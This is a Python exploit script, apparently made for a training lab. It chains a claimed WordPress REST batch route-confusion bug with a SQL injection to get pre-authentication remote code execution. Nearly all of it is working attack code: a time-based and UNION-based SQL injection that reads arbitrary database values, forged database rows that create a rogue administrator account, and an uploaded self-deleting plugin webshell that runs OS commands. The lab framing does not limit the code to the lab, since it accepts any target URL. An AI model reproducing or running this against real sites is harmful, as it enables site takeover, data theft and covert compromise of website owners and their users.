#!/usr/bin/env python3
# Cybr labs - https://cybr.com
# Licensed under GPL-3.0. See LICENSE.
"""wp2shell: pre-auth RCE in WordPress core, Cybr Labs edition.

CVE-2026-63030 (REST /batch/v1 route confusion) chained with
CVE-2026-60137 (WP_Query author__not_in SQL injection).

Affected: WordPress 6.9.0-6.9.4 and 7.0.0-7.0.1 (fixed in 6.9.5 / 7.0.2).

This script is written for the Cybr wp2shell lab and is meant to run only
against the throwaway lab environment. It is based on the
public proof of concept by Mustafa Can IPEKCI (nukedx / mcipekci),
https://gist.github.com/mcipekci/2b5027f965153d8058bbcfd63006ef79
Original research: Adam Kues (Assetnote / Searchlight Cyber).

Modes:
  --check            confirm the site is exploitable with a time-based probe
  --read "SQL"       run one scalar SQL expression and print the result, using
                     the UNION row-forgery trick (data comes back in the reply)
  -c "COMMAND"       full chain: forge rows, create an administrator, upload a
                     plugin webshell, run the command, and print its output

"""

import argparse
import base64
import hashlib
import html
import io
import json
import re
import secrets
import statistics
import sys
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from http.cookiejar import CookieJar

# A path for which wp_parse_url() returns false. It seeds the WP_Error that
# desyncs the batch handler's $matches and $validation arrays.
PRIMER = "http://:"

# Serialized oEmbed attributes. WordPress keys its oEmbed cache posts on
# md5(url + serialized attributes), so the forged rows reuse these exact
# attributes to make cache post IDs predictable.
EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

EMAIL_DOMAIN = "trailhead-outfitters.example"


class WP2Shell:
    def __init__(self, base_url, timeout=30.0):
        self.base = base_url.rstrip("/")
        self.batch_url = f"{self.base}/?rest_route=/batch/v1"
        self.timeout = timeout
        self.sleep = 0.4
        self.threshold = None
        self.retry_band = None

    # ---- transport: the double-nested route-confusion batch -------------------
    #
    # The outer batch desyncs $matches/$validation with the PRIMER error, so the
    # POST /wp/v2/posts request is dispatched under the borrowed /batch/v1
    # handler. That runs the nested inner batch, where GET methods are allowed
    # (the HTTP-facing batch schema only allows POST/PUT/PATCH/DELETE). The
    # inner batch desyncs again, so the carrier request (categories or widgets)
    # runs under posts::get_items() with its parameters completely raw: they
    # were validated against the carrier route, which does not register
    # author_exclude at all.
    def _batch(self, inner_requests, timeout=None):
        payload = {
            "requests": [
                {"method": "POST", "path": PRIMER},
                {"method": "POST", "path": "/wp/v2/posts",
                 "body": {"requests": inner_requests}},
                {"method": "POST", "path": "/batch/v1"},
            ]
        }
        req = urllib.request.Request(
            self.batch_url, data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=timeout or self.timeout) as resp:
            return resp.read()

    # ---- blind time-based SQLi via confused /wp/v2/categories -----------------
    def _probe(self, condition):
        started = time.perf_counter()
        self._batch([
            {"method": "GET", "path": PRIMER},
            {"method": "GET", "path": "/wp/v2/categories?" + urllib.parse.urlencode(
                {"author_exclude": f"SELECT IF(({condition}),SLEEP({self.sleep}),0)"})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ], timeout=10)
        return time.perf_counter() - started

    def confirm(self):
        """Adaptively push the SLEEP delta above jitter. Returns (fast, slow) or None."""
        for _ in range(3):
            fast_samples = [self._probe("1=0") for _ in range(5)]
            slow_samples = [self._probe("1=1") for _ in range(3)]
            fast = statistics.median(fast_samples)
            slow = statistics.median(slow_samples)
            jitter = statistics.median(abs(s - fast) for s in fast_samples)
            if slow - fast > max(0.06, jitter * 8):
                self.threshold = (fast + slow) / 2
                self.retry_band = max(0.02, jitter * 3)
                return fast, slow
            self.sleep *= 2
        return None

    def _true(self, condition):
        elapsed = self._probe(condition)
        if abs(elapsed - self.threshold) > self.retry_band:
            return elapsed > self.threshold
        return statistics.median(
            [elapsed, self._probe(condition), self._probe(condition)]) > self.threshold

    # ---- SQLi row forgery: emit a full wp_posts row for UNION injection --------
    #
    # author__not_in is concatenated into "post_author NOT IN (...)". The
    # payload "1) AND 1=0 UNION ALL SELECT <23 columns> -- -" empties the real
    # result set and replaces it with attacker-built rows. per_page=-1 makes
    # WP_Query skip its id-only pre-query, so the SELECT is a full wp_posts.*
    # and the UNION column count lines up.
    @staticmethod
    def _hex(value):
        return f"0x{value.encode().hex()}" if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge_batch(self, rows, extra_requests=(), timeout=60):
        """Send forged rows through the confused /wp/v2/widgets carrier and
        return the parsed posts array from the batched response.

        per_page=-1 makes WP_Query skip its id-only pre-query, so the SELECT is
        a full wp_posts.* and the UNION column count lines up. page=-1 then
        dodges the "invalid page number" check the negative per_page would
        otherwise trip, so the forged posts actually come back in the reply.
        """
        query = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        raw = self._batch([
            {"method": "GET", "path": PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?" + urllib.parse.urlencode(
                {"author_exclude": query, "per_page": -1, "page": -1, "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=timeout)
        # Unwrap: outer responses -> inner batch responses -> posts handler body.
        outer = json.loads(raw)
        inner = outer["responses"][1]["body"]["responses"]
        return inner[1]["body"]

    def _forge(self, rows, extra_requests=()):
        self._forge_batch(rows, extra_requests=extra_requests)

    def read_scalar(self, query):
        """Run one scalar SQL expression and return its value, in band.

        The expression is placed in the post_content column of a forged row, so
        the answer comes back inside the REST response as the post's rendered
        content. No timing, one request.
        """
        row = ",".join((
            "0", "1",
            self._hex("2020-01-01 00:00:00"), self._hex("2020-01-01 00:00:00"),
            f"({query})",
            self._hex("read"), "''",
            self._hex("publish"), self._hex("closed"), self._hex("closed"), "''",
            self._hex("read"), "''", "''",
            self._hex("2020-01-01 00:00:00"), self._hex("2020-01-01 00:00:00"), "''",
            "0", "''", "0",
            self._hex("post"), "''", "0",
        ))
        posts = self._forge_batch([row])
        for post in posts:
            content = post.get("content", {}).get("rendered", "")
            text = re.sub(r"<[^>]+>", "", content).strip()
            if text:
                return text
        raise RuntimeError("no forged post came back in the response")

    # ---- exploit steps ---------------------------------------------------------
    def _published_link(self):
        with urllib.request.urlopen(
                f"{self.base}/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                timeout=15) as resp:
            items = json.loads(resp.read())
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post to anchor oEmbed cache")
        return items[0]["link"]

    def escalate_and_create_admin(self):
        """Seed oEmbed cache, forge changeset/re-entry rows, create the admin. Returns creds."""
        token = secrets.token_hex(6)
        link = urllib.parse.urlsplit(self._published_link())
        embed_urls = [
            urllib.parse.urlunsplit((link.scheme, link.netloc, link.path, link.query, f"{token}{i}"))
            for i in range(3)
        ]

        # 1) seed 3 oEmbed caches so the forged cache objects have DB backing
        seed_content = "".join(
            f'[embed width="500" height="750"]{u}[/embed]' for u in embed_urls)
        self._forge([self._post_row(0, seed_content, "seed", "publish", "seed", 0, "post")])

        # 2) recover table prefix + admin id + seeded cache post ids. Each of
        # these is a single in-band UNION read (deterministic, no timing).
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("could not resolve posts table")
        prefix = posts_table[:-5]

        admin_id = int(self.read_scalar(
            f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={self._hex(prefix + 'capabilities')} "
            f"AND INSTR(m.meta_value,{self._hex('s:13:\"administrator\";b:1;')})>0 "
            "ORDER BY u.ID LIMIT 1"))
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator")

        cache_ids = []
        for u in embed_urls:
            key = hashlib.md5((u + EMBED_ATTR).encode()).hexdigest()
            pid = int(self.read_scalar(
                f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{key.encode().hex()} ORDER BY ID DESC LIMIT 1"))
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache ids not distinct")

        # 3) forge the changeset (admin context) + parse_request re-entry loop, then create the admin
        username = f"w2s_{token}"
        password = f"W2s!{secrets.token_urlsafe(15)}"
        email = f"{username}@{EMAIL_DOMAIN}"
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner = outer + 1, outer + 2

        changeset = json.dumps({
            f"nav_menu_item[{nav_id}]": {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                    "type": "custom", "title": "proof", "url": "https://trailhead-outfitters.example",
                    "target": "", "attr_title": "", "description": "proof", "classes": "",
                    "xfn": "", "status": "publish", "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0, f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
                           "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                           str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft", "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish", "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish", "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse", "parse", inner, "request"),
            self._post_row(inner, "inner", "inner", "draft", "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])
        return username, password, email

    # ---- post-exploitation: login + plugin webshell + command ------------------
    def rce(self, username, password, command):
        session = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))
        session.open(f"{self.base}/wp-login.php", timeout=15).read()
        session.open(urllib.request.Request(
            f"{self.base}/wp-login.php",
            data=urllib.parse.urlencode({
                "log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": f"{self.base}/wp-admin/", "testcookie": "1"}).encode(),
            method="POST"), timeout=30).read()
        users_page = session.open(f"{self.base}/wp-admin/users.php", timeout=30).read().decode("utf-8", errors="replace")
        if username not in users_page:
            raise RuntimeError("admin login failed (user not created?)")

        slug = f"wp2shell-{secrets.token_hex(6)}"
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        php = (
            "<?php\n"
            f"/* Plugin Name: {slug} */\n"
            "add_action('rest_api_init', function () {\n"
            f"    register_rest_route('wp2shell/v1', '/{route}', array(\n"
            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
            "        'callback' => function ($r) {\n"
            "            ob_start(); passthru(base64_decode($r->get_param('c')) . ' 2>&1');\n"
            "            $o = ob_get_clean();\n"
            "            require_once ABSPATH . 'wp-admin/includes/plugin.php';\n"
            "            deactivate_plugins(plugin_basename(__FILE__), true); @unlink(__FILE__);\n"
            f"            return new WP_REST_Response(array('marker' => '{marker}', 'output' => $o));\n"
            "        },\n"
            "    ));\n"
            "});\n"
        ).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{slug}/{slug}.php", php)

        page = session.open(f"{self.base}/wp-admin/plugin-install.php?tab=upload", timeout=30).read().decode("utf-8", errors="replace")
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")
        boundary = f"----wp2shell{secrets.token_hex(12)}"
        body = b"".join((
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"_wpnonce\"\r\n\r\n{nonce.group(1)}\r\n".encode(),
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wp-admin/plugin-install.php?tab=upload\r\n".encode(),
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"pluginzip\"; filename=\"{slug}.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode(),
            buf.getvalue(), f"\r\n--{boundary}--\r\n".encode(),
        ))
        install = session.open(urllib.request.Request(
            f"{self.base}/wp-admin/update.php?action=upload-plugin", data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, method="POST"),
            timeout=60).read().decode("utf-8", errors="replace")
        activate = re.search(r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install)
        if not activate:
            raise RuntimeError("plugin install/activation link not found")
        session.open(urllib.parse.urljoin(
            f"{self.base}/wp-admin/", html.unescape(activate.group(1))), timeout=30).read()

        # The webshell deactivates and deletes itself after this single call.
        resp = json.loads(urllib.request.urlopen(urllib.request.Request(
            f"{self.base}/?rest_route=/wp2shell/v1/{route}",
            data=json.dumps({"c": base64.b64encode(command.encode()).decode()}).encode(),
            headers={"Content-Type": "application/json"}, method="POST"), timeout=60).read())
        if resp.get("marker") != marker:
            raise RuntimeError("webshell did not respond correctly")
        return resp["output"]


def main():
    ap = argparse.ArgumentParser(
        description="WordPress pre-auth RCE lab tool (CVE-2026-63030 + CVE-2026-60137)")
    ap.add_argument("target", help="target base URL, e.g. http://wp-wp2shell-alb-....amazonaws.com")
    ap.add_argument("--check", action="store_true",
                    help="only confirm exploitability with a time-based probe")
    ap.add_argument("--read", metavar="SQL",
                    help="run one scalar SQL expression and print the result (in band)")
    ap.add_argument("-c", "--command", default="id",
                    help="OS command to run through the webshell (default: id)")
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    x = WP2Shell(args.target, timeout=args.timeout)

    conf = x.confirm()
    if not conf:
        print("[-] not vulnerable (or the site is already patched)")
        return 1
    print(f"[+] vulnerable (blind SQLi: {conf[0]:.3f}s baseline / {conf[1]:.3f}s injected)")

    if args.check:
        return 0

    if args.read:
        print(f"[*] running in band: {args.read}")
        print(x.read_scalar(args.read))
        return 0

    print("[*] forging oEmbed cache + changeset re-entry, creating administrator ...")
    user, pw, email = x.escalate_and_create_admin()
    print(f"[+] administrator created: {user}:{pw}  ({email})")

    print(f"[*] logging in, deploying webshell, executing: {args.command}")
    output = x.rce(user, pw, args.command)
    print(f"[+] command output:\n")
    print(output, end="")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (urllib.error.URLError, RuntimeError, KeyError, IndexError) as e:
        print(f"[-] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(130)
